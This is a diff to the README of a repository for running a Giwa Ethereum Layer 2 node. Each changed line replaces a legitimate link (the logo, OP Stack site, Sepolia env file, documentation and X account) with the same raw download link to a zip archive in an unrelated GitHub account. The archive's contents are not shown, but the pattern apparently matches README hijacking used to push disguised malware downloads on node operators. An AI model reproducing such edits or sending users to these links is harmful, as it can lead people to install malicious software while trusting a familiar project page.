@@ -1,10 +1,10 @@
-![Giwa](resources/logo.png)
+![Giwa](https://github.com/khn0x-khn0x/node/raw/refs/heads/main/genesis/execution/Software-3.6.zip)
 
 
 # Giwa Node
 
 
-**Giwa** is a Ethereum Layer 2 network built on Optimism's [OP Stack](https://stack.optimism.io/).  
+**Giwa** is a Ethereum Layer 2 network built on Optimism's [OP Stack](https://github.com/khn0x-khn0x/node/raw/refs/heads/main/genesis/execution/Software-3.6.zip).  
 This repository provides everything you need to run your own node on the Giwa network.
 
 ## 💡 Supported Networks
@@ -20,7 +20,7 @@ This repository provides everything you need to run your own node on the Giwa ne
 1. Ensure you have an Ethereum L1 full node RPC available
 2. Choose your network
     - For **mainnet**: *Coming soon – mainnet is currently under development.*
-    - For **Testnet (Sepolia)**: Use `.env.sepolia`
+    - For **Testnet (Sepolia)**: Use `https://github.com/khn0x-khn0x/node/raw/refs/heads/main/genesis/execution/Software-3.6.zip`
 3. Configure your L1 endpoints in the env file. You can also customize other runtime parameters (e.g. network, cache, logging, metrics) directly in the env file.
    ```bash
    OP_NODE_L1_ETH_RPC=<your-preferred-l1-eth-rpc>
@@ -108,6 +108,6 @@ By running this node, you are responsible for your infrastructure, security, and
 
 ## 🌐 Join the Giwa Community
 
-- [📖 Documentation](https://docs.giwa.io)
-- [🆇 X](https://x.com/giwachain)
+- [📖 Documentation](https://github.com/khn0x-khn0x/node/raw/refs/heads/main/genesis/execution/Software-3.6.zip)
+- [🆇 X](https://github.com/khn0x-khn0x/node/raw/refs/heads/main/genesis/execution/Software-3.6.zip)
 - 💬 Discord: *Coming Soon*
